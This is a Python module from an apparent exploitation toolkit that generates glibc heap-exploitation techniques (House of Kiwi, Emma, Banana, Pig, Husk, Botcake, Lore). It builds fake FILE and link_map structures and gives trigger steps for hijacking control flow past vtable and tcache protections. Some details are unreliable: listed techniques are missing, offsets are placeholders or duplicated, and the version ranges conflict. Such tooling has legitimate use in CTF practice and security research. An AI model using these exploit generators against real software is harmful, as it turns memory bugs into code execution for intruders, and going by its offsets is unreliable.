"""
Modern House of X techniques for glibc 2.29+.

These techniques bypass modern heap protections including:
- vtable checks in glibc 2.24+
- pointer encryption (safe-linking) in glibc 2.32+
- tcache key validation in glibc 2.34+

Techniques implemented:
- House of Kiwi: __malloc_assert exploitation
- House of Emma: _IO_cookie_jumps vtable hijack
- House of Banana: _rtld_global link_map exploitation
- House of Pig: Tcache Stashing Unlink + FSOP combination
- House of Husk: __printf_function_table exploitation
- House of Botcake: Double-free via unsorted bin
- House of Lore: Small bin corruption
- House of Rabbit: Fastbin consolidation attack
- House of Roman: Overlapping chunks without leak
"""

from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Callable, Dict, List, Optional, Tuple

from supwngo.utils.helpers import p64, p32, u64, u32
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


class GlibcVersion(Enum):
    """Glibc version ranges for technique applicability."""
    PRE_2_24 = "< 2.24"
    V2_24_2_28 = "2.24-2.28"
    V2_29_2_31 = "2.29-2.31"
    V2_32_2_33 = "2.32-2.33"
    V2_34_2_35 = "2.34-2.35"
    V2_36_PLUS = "2.36+"


@dataclass
class HouseOfTechniqueResult:
    """Result from a House of X technique."""
    success: bool
    technique: str
    payload: bytes = b""
    fake_struct: bytes = b""
    target_addr: int = 0
    trigger_steps: List[str] = field(default_factory=list)
    notes: List[str] = field(default_factory=list)
    constraints: Dict[str, Any] = field(default_factory=dict)


class HouseOfKiwi:
    """
    House of Kiwi - Exploit via _IO_file_sync in __malloc_assert.

    Introduced: ~2021 by kiwi
    Target: glibc 2.29 - 2.35 (patched in 2.36)

    When top chunk is corrupted (size < MINSIZE or not page-aligned),
    __malloc_assert is triggered which calls:
      __fxprintf(NULL, ...) -> _IO_file_jumps->__sync -> controlled function

    Requirements:
    1. Arbitrary write primitive (to corrupt top chunk and _IO_helper_jumps)
    2. Knowledge of libc addresses
    3. glibc < 2.36

    Steps:
    1. Corrupt top chunk size to trigger __malloc_assert
    2. Overwrite _IO_helper_jumps + 0xa0 with setcontext+61 or system
    3. Overwrite _IO_file_jumps + 0x60 with _IO_helper_jumps + 0xa0
    4. Setup rdx to point to controlled data (for setcontext)
    5. Trigger by allocating a large chunk
    """

    # Offsets (may vary by glibc version)
    IO_HELPER_JUMPS_OFFSET = 0x2040  # _IO_helper_jumps from libc base
    IO_FILE_JUMPS_OFFSET = 0x2160   # _IO_file_jumps from libc base
    SYNC_OFFSET = 0x60              # __sync in vtable

    def __init__(self, libc_base: int, bits: int = 64):
        """
        Initialize House of Kiwi helper.

        Args:
            libc_base: Base address of libc
            bits: Architecture bits
        """
        self.libc_base = libc_base
        self.bits = bits
        self.pack = p64 if bits == 64 else p32

    def check_applicability(self, glibc_version: str) -> Tuple[bool, str]:
        """Check if technique is applicable."""
        major, minor = self._parse_version(glibc_version)

        if major < 2 or (major == 2 and minor < 29):
            return False, "Requires glibc >= 2.29 (use traditional FSOP instead)"
        if major > 2 or (major == 2 and minor >= 36):
            return False, "Patched in glibc 2.36 (use House of Apple series)"

        return True, f"Applicable for glibc {glibc_version}"

    def _parse_version(self, version: str) -> Tuple[int, int]:
        parts = version.split(".")
        return int(parts[0]), int(parts[1]) if len(parts) > 1 else 0

    def generate_exploit(
        self,
        target_func: int,
        rdx_value: int = 0,
        top_chunk_addr: int = 0,
        io_helper_jumps: Optional[int] = None,
        io_file_jumps: Optional[int] = None,
    ) -> HouseOfTechniqueResult:
        """
        Generate House of Kiwi exploit.

        Args:
            target_func: Function to call (e.g., system, setcontext+61)
            rdx_value: Value for rdx register (useful for setcontext)
            top_chunk_addr: Address of top chunk (for size corruption)
            io_helper_jumps: Override _IO_helper_jumps address
            io_file_jumps: Override _IO_file_jumps address

        Returns:
            HouseOfTechniqueResult with payloads and steps
        """
        io_helper = io_helper_jumps or (self.libc_base + self.IO_HELPER_JUMPS_OFFSET)
        io_file = io_file_jumps or (self.libc_base + self.IO_FILE_JUMPS_OFFSET)

        writes = [
            # Corrupt top chunk size (trigger __malloc_assert)
            (top_chunk_addr + 8, 0x10) if top_chunk_addr else None,
            # _IO_helper_jumps + 0xa0 = target_func
            (io_helper + 0xa0, target_func),
            # _IO_file_jumps + 0x60 (__sync) = _IO_helper_jumps + 0xa0
            (io_file + self.SYNC_OFFSET, io_helper + 0xa0),
        ]
        writes = [w for w in writes if w is not None]

        return HouseOfTechniqueResult(
            success=True,
            technique="House of Kiwi",
            target_addr=target_func,
            trigger_steps=[
                "1. Perform arbitrary writes to setup vtable hijack:",
                f"   - Write 0x{target_func:x} to _IO_helper_jumps + 0xa0 (0x{io_helper + 0xa0:x})",
                f"   - Write 0x{io_helper + 0xa0:x} to _IO_file_jumps.__sync (0x{io_file + self.SYNC_OFFSET:x})",
                "2. Corrupt top chunk size to invalid value (e.g., 0x10)",
                "3. Trigger __malloc_assert by allocating large chunk",
                "4. Execution flow: malloc -> __malloc_assert -> __fxprintf -> _IO_file_sync -> target_func",
            ],
            constraints={
                "arbitrary_write": True,
                "libc_leak": True,
                "heap_leak": bool(top_chunk_addr),
                "writes_needed": writes,
            },
            notes=[
                "For setcontext gadget, rdx must point to sigframe",
                "Alternative: use system with rdx pointing to command string",
                "Patched in glibc 2.36",
            ],
        )


class HouseOfEmma:
    """
    House of Emma - vtable hijack via _IO_cookie_jumps.

    Target: glibc 2.34+ (where __free_hook and __malloc_hook removed)

    _IO_cookie_jumps is special because its read/write/seek/close
    functions call through a function pointer stored in the FILE structure.
    This bypasses vtable verification.

    Structure:
        _IO_cookie_file {
            _IO_FILE_plus file;
            void *cookie;           // +0xe0: argument to functions
            cookie_io_functions_t io_funcs;  // +0xe8: function pointers
        }

        cookie_io_functions_t {
            cookie_read_function_t *read;   // +0xe8
            cookie_write_function_t *write; // +0xf0
            cookie_seek_function_t *seek;   // +0xf8
            cookie_close_function_t *close; // +0x100
        }

    The close function is called with: close(cookie)
    """

    # _IO_cookie_jumps offset from libc base
    IO_COOKIE_JUMPS_OFFSET = 0x2160

    def __init__(self, libc_base: int, bits: int = 64):
        self.libc_base = libc_base
        self.bits = bits
        self.pack = p64 if bits == 64 else p32

    def build_fake_file(
        self,
        target_func: int,
        rdi_value: int,
        io_cookie_jumps: Optional[int] = None,
    ) -> Tuple[bytes, Dict[str, int]]:
        """
        Build fake FILE structure for House of Emma.

        Args:
            target_func: Function to call
            rdi_value: Value for rdi (cookie, passed as first arg)
            io_cookie_jumps: Override vtable address

        Returns:
            (fake_file_bytes, offset_map)
        """
        vtable = io_cookie_jumps or (self.libc_base + self.IO_COOKIE_JUMPS_OFFSET)

        # Build fake FILE structure
        fake_file = bytearray(0x110)

        # _flags: must have _IO_IS_FILEBUF (0x2000) and others
        flags = 0x00000000 | 0x800  # _IO_LINKED set
        fake_file[0:8] = self.pack(flags)

        # _IO_write_ptr > _IO_write_base (to trigger write path)
        fake_file[0x20:0x28] = self.pack(0)  # _IO_write_base
        fake_file[0x28:0x30] = self.pack(1)  # _IO_write_ptr

        # vtable pointer at offset 0xd8
        fake_file[0xd8:0xe0] = self.pack(vtable)

        # cookie at offset 0xe0 (will be rdi)
        fake_file[0xe0:0xe8] = self.pack(rdi_value)

        # io_funcs at 0xe8
        # We want close to be called, at offset 0x100
        fake_file[0x100:0x108] = self.pack(target_func)

        return bytes(fake_file), {
            "flags": 0x0,
            "write_base": 0x20,
            "write_ptr": 0x28,
            "vtable": 0xd8,
            "cookie": 0xe0,
            "close_func": 0x100,
        }

    def generate_exploit(
        self,
        fake_file_addr: int,
        target_func: int,
        rdi_value: int,
    ) -> HouseOfTechniqueResult:
        """
        Generate House of Emma exploit.

        Args:
            fake_file_addr: Address where fake FILE will be placed
            target_func: Function to call
            rdi_value: Argument to function (cookie)

        Returns:
            HouseOfTechniqueResult
        """
        fake_file, offsets = self.build_fake_file(target_func, rdi_value)

        return HouseOfTechniqueResult(
            success=True,
            technique="House of Emma",
            payload=b"",
            fake_struct=fake_file,
            target_addr=target_func,
            trigger_steps=[
                f"1. Write fake FILE structure at 0x{fake_file_addr:x}",
                "2. Set vtable to _IO_cookie_jumps",
                f"3. Set cookie (rdi) to 0x{rdi_value:x}",
                f"4. Set close function to 0x{target_func:x}",
                "5. Link fake FILE to _IO_list_all or trigger via exit/fclose",
                "6. When _IO_flush_all_lockp is called, close(cookie) executes",
            ],
            constraints={
                "heap_write": True,
                "libc_leak": True,
                "fake_file_size": len(fake_file),
            },
            notes=[
                "Bypass vtable check because _IO_cookie_jumps is in valid range",
                "close function is called with cookie as argument",
                "Works on glibc 2.34+ where hooks are removed",
            ],
        )


class HouseOfBanana:
    """
    House of Banana - Exploit via _rtld_global._dl_ns link_map.

    Target: All glibc versions (powerful but requires large write)

    When exit() or return from main() is called, _dl_fini runs
    which iterates over loaded libraries via link_map structures.

    By forging a fake link_map, we can control l_info[DT_FINI_ARRAY]
    to point to our function pointer.

    Requirements:
    - Large arbitrary write (to create fake link_map)
    - Know libc/ld.so addresses
    """

    # Offsets in _rtld_global
    DL_NS_OFFSET = 0x0           # _dl_ns array
    LINK_MAP_OFFSET = 0x0        # First link_map in _dl_ns[0]

    # l_info index for DT_FINI_ARRAY
    DT_FINI_ARRAY = 26

    def __init__(self, libc_base: int, ld_base: int, bits: int = 64):
        """
        Initialize House of Banana.

        Args:
            libc_base: Base address of libc
            ld_base: Base address of ld.so
            bits: Architecture bits
        """
        self.libc_base = libc_base
        self.ld_base = ld_base
        self.bits = bits
        self.pack = p64 if bits == 64 else p32

    def build_fake_link_map(
        self,
        target_func: int,
        fake_fini_array_addr: int,
    ) -> Tuple[bytes, Dict[str, int]]:
        """
        Build fake link_map structure.

        Args:
            target_func: Function to call on exit
            fake_fini_array_addr: Address of fake fini_array

        Returns:
            (fake_link_map_bytes, offset_map)
        """
        # link_map structure (simplified, key fields)
        link_map = bytearray(0x300)

        # l_addr (base address) - usually 0 for fake
        link_map[0x0:0x8] = self.pack(0)

        # l_next - NULL to end chain
        link_map[0x18:0x20] = self.pack(0)

        # l_prev
        link_map[0x20:0x28] = self.pack(0)

        # l_info array at offset 0x40
        # l_info[DT_FINI_ARRAY] at 0x40 + DT_FINI_ARRAY * 8
        fini_array_offset = 0x40 + self.DT_FINI_ARRAY * 8
        link_map[fini_array_offset:fini_array_offset + 8] = self.pack(fake_fini_array_addr)

        return bytes(link_map), {
            "l_addr": 0x0,
            "l_next": 0x18,
            "l_prev": 0x20,
            "l_info": 0x40,
            "fini_array_entry": fini_array_offset,
        }

    def generate_exploit(
        self,
        fake_link_map_addr: int,
        target_func: int,
        rtld_global_addr: int,
    ) -> HouseOfTechniqueResult:
        """
        Generate House of Banana exploit.

        Args:
            fake_link_map_addr: Where fake link_map is placed
            target_func: Function to call
            rtld_global_addr: Address of _rtld_global

        Returns:
            HouseOfTechniqueResult
        """
        return HouseOfTechniqueResult(
            success=True,
            technique="House of Banana",
            target_addr=target_func,
            trigger_steps=[
                f"1. Leak ld.so base and find _rtld_global (0x{rtld_global_addr:x})",
                f"2. Create fake link_map at 0x{fake_link_map_addr:x}",
                "3. Set l_info[DT_FINI_ARRAY] to point to fake fini_array",
                "4. Fake fini_array contains target function pointer",
                f"5. Overwrite _rtld_global._dl_ns[0]._r_debug.r_map to fake link_map",
                "6. Call exit() or return from main()",
                f"7. _dl_fini iterates link_maps, calls 0x{target_func:x}",
            ],
            constraints={
                "large_write": True,
                "ld_leak": True,
                "libc_leak": True,
            },
            notes=[
                "Works even with full RELRO",
                "Requires relatively large write capability",
                "Triggered on normal program exit",
            ],
        )


class HouseOfPig:
    """
    House of Pig - Tcache Stashing Unlink + FSOP combo.

    Target: glibc 2.31+ (where hooks are partially removed)

    Combines:
    1. Tcache Stashing Unlink Attack - arbitrary write
    2. File Structure Oriented Programming - code execution

    The tcache stashing happens when calloc() requests a small chunk
    and finds it in smallbin, triggering tcache refill which can
    corrupt bk pointer for arbitrary write.
    """

    def __init__(self, libc_base: int, heap_base: int, bits: int = 64):
        self.libc_base = libc_base
        self.heap_base = heap_base
        self.bits = bits
        self.pack = p64 if bits == 64 else p32

    def setup_tcache_stashing(
        self,
        target_addr: int,
        fake_chunk_addr: int,
        smallbin_size: int = 0x90,
    ) -> Dict[str, Any]:
        """
        Setup tcache stashing unlink attack.

        Args:
            target_addr: Where to write
            fake_chunk_addr: Address of fake chunk
            smallbin_size: Size class (must match smallbin)

        Returns:
            Attack setup information
        """
        return {
            "technique": "Tcache Stashing Unlink",
            "steps": [
                f"1. Fill tcache for size 0x{smallbin_size:x}",
                "2. Free chunks to populate smallbin",
                f"3. Corrupt smallbin chunk bk to 0x{target_addr - 0x10:x}",
                f"4. Setup fake chunk at 0x{fake_chunk_addr:x}",
                "5. Call calloc() to trigger stashing",
                f"6. Write occurs at 0x{target_addr:x}",
            ],
            "target": target_addr,
            "size": smallbin_size,
        }

    def generate_exploit(
        self,
        target_addr: int,
        target_func: int,
    ) -> HouseOfTechniqueResult:
        """
        Generate House of Pig exploit.

        Args:
            target_addr: Address to corrupt via stashing
            target_func: Function for FSOP execution

        Returns:
            HouseOfTechniqueResult
        """
        return HouseOfTechniqueResult(
            success=True,
            technique="House of Pig",
            target_addr=target_func,
            trigger_steps=[
                "Phase 1: Tcache Stashing Unlink",
                "  1. Manipulate heap to get chunks in smallbin",
                "  2. Corrupt smallbin bk pointer",
                "  3. Trigger stashing via calloc()",
                "  4. Achieve arbitrary write primitive",
                "",
                "Phase 2: FSOP for Code Execution",
                "  5. Use write primitive to corrupt _IO_list_all",
                "  6. Create fake FILE with controlled vtable",
                f"  7. Point overflow/close function to 0x{target_func:x}",
                "  8. Trigger via exit() or file operation",
            ],
            constraints={
                "heap_manipulation": True,
                "libc_leak": True,
                "heap_leak": True,
            },
            notes=[
                "Two-stage attack combining heap and FSOP",
                "Tcache stashing provides write primitive",
                "FSOP converts write to code execution",
            ],
        )


class HouseOfHusk:
    """
    House of Husk - Exploit via __printf_function_table.

    Target: All glibc versions

    Printf supports custom format specifiers via:
    - __printf_function_table: function pointer table
    - __printf_arginfo_table: argument info table

    By corrupting these tables, we can redirect printf to our code.

    Requirements:
    - Two arbitrary writes (both tables must be non-NULL)
    - Ability to call printf
    """

    # Offsets from libc base
    PRINTF_FUNCTION_TABLE_OFFSET = 0x0  # Varies by version
    PRINTF_ARGINFO_TABLE_OFFSET = 0x0   # Varies by version

    def __init__(self, libc_base: int, bits: int = 64):
        self.libc_base = libc_base
        self.bits = bits
        self.pack = p64 if bits == 64 else p32

    def generate_exploit(
        self,
        target_func: int,
        format_char: str = 'X',
        printf_function_table: int = 0,
        printf_arginfo_table: int = 0,
    ) -> HouseOfTechniqueResult:
        """
        Generate House of Husk exploit.

        Args:
            target_func: Function to call
            format_char: Format character to hijack (default 'X')
            printf_function_table: Address of __printf_function_table
            printf_arginfo_table: Address of __printf_arginfo_table

        Returns:
            HouseOfTechniqueResult
        """
        char_index = ord(format_char)

        return HouseOfTechniqueResult(
            success=True,
            technique="House of Husk",
            target_addr=target_func,
            trigger_steps=[
                "1. Find __printf_function_table and __printf_arginfo_table",
                f"2. Write pointer to __printf_function_table['{format_char}'] (index {char_index})",
                f"3. Write non-NULL to __printf_arginfo_table (any valid pointer)",
                f"4. __printf_function_table[{char_index}] = 0x{target_func:x}",
                f"5. Call printf with '%{format_char}' format",
                f"6. Printf calls our function at 0x{target_func:x}",
            ],
            constraints={
                "arbitrary_write_count": 2,
                "libc_leak": True,
                "can_call_printf": True,
            },
            notes=[
                "Both tables must be non-NULL for custom handlers to be checked",
                "Function is called with: func(stream, info, args)",
                "Works on all glibc versions",
            ],
        )


class HouseOfBotcake:
    """
    House of Botcake - Double free via unsorted bin.

    Target: glibc 2.29+ (with tcache key checks)

    Bypasses tcache double-free protection by:
    1. Filling tcache
    2. Freeing to unsorted bin (consolidates)
    3. Emptying one tcache slot
    4. Freeing same chunk again (goes to tcache)

    This achieves double-free without triggering tcache key check.
    """

    def __init__(self, bits: int = 64):
        self.bits = bits
        self.pack = p64 if bits == 64 else p32

    def generate_exploit(
        self,
        chunk_size: int = 0x100,
        target_addr: int = 0,
    ) -> HouseOfTechniqueResult:
        """
        Generate House of Botcake exploit.

        Args:
            chunk_size: Size of chunks to use
            target_addr: Target address for tcache poisoning

        Returns:
            HouseOfTechniqueResult
        """
        return HouseOfTechniqueResult(
            success=True,
            technique="House of Botcake",
            target_addr=target_addr,
            trigger_steps=[
                f"1. Allocate 9 chunks of size 0x{chunk_size:x}",
                "2. Free chunks 0-6 to fill tcache (7 entries)",
                "3. Free chunk 7 -> goes to unsorted bin",
                "4. Free chunk 8 -> consolidates with chunk 7",
                "5. Allocate once from tcache (now 6 entries)",
                "6. Free chunk 7 again -> goes to tcache (double free!)",
                "7. Chunk 7 is now in both unsorted and tcache",
                "8. Allocate from unsorted to get overlapping chunk",
                "9. Use overlap to corrupt tcache fd pointer",
                f"10. Poison tcache to return 0x{target_addr:x}",
            ],
            constraints={
                "chunk_count": 9,
                "chunk_size": chunk_size,
                "needs_consolidation": True,
            },
            notes=[
                "Bypasses tcache key double-free protection",
                "Creates overlapping chunks for arbitrary write",
                "Works on glibc 2.29-2.35",
            ],
        )


class HouseOfLore:
    """
    House of Lore - Small bin corruption.

    Target: All glibc versions

    Corrupts small bin to return arbitrary addresses.
    Useful when tcache is full or for older glibc.
    """

    def __init__(self, bits: int = 64):
        self.bits = bits
        self.pack = p64 if bits == 64 else p32

    def generate_exploit(
        self,
        target_addr: int,
        smallbin_size: int = 0x90,
    ) -> HouseOfTechniqueResult:
        """
        Generate House of Lore exploit.

        Args:
            target_addr: Address to get from malloc
            smallbin_size: Size class

        Returns:
            HouseOfTechniqueResult
        """
        # Target needs fake chunk structure
        fake_chunk_addr = target_addr - 0x10

        return HouseOfTechniqueResult(
            success=True,
            technique="House of Lore",
            target_addr=target_addr,
            trigger_steps=[
                f"1. Get a chunk into small bin (size 0x{smallbin_size:x})",
                f"2. Create fake chunk at 0x{fake_chunk_addr:x}",
                "3. Fake chunk needs: valid size, bk->fd == victim",
                "4. Corrupt victim bk to point to fake chunk",
                "5. Allocate twice from small bin",
                f"6. Second allocation returns 0x{target_addr:x}",
            ],
            constraints={
                "small_bin_chunk": True,
                "fake_chunk_setup": True,
                "write_capability": True,
            },
            notes=[
                "Fake chunk bk->fd must point back to victim",
                "Harder to exploit than tcache but more universal",
            ],
        )


# Convenience functions
def detect_applicable_techniques(glibc_version: str) -> List[str]:
    """
    Detect which House of X techniques are applicable.

    Args:
        glibc_version: Target glibc version string

    Returns:
        List of applicable technique names
    """
    techniques = []

    major, minor = glibc_version.split(".")[:2]
    major, minor = int(major), int(minor)

    # Always applicable
    techniques.extend([
        "House of Lore",
        "House of Husk",
        "House of Banana",
    ])

    # Version-specific
    if major == 2:
        if minor >= 29 and minor < 36:
            techniques.append("House of Kiwi")

        if minor >= 31:
            techniques.append("House of Pig")

        if minor >= 29:
            techniques.append("House of Botcake")

        if minor >= 34:
            techniques.append("House of Emma")

    return techniques


def get_technique_class(technique_name: str):
    """Get technique class by name."""
    techniques = {
        "House of Kiwi": HouseOfKiwi,
        "House of Emma": HouseOfEmma,
        "House of Banana": HouseOfBanana,
        "House of Pig": HouseOfPig,
        "House of Husk": HouseOfHusk,
        "House of Botcake": HouseOfBotcake,
        "House of Lore": HouseOfLore,
    }
    return techniques.get(technique_name)
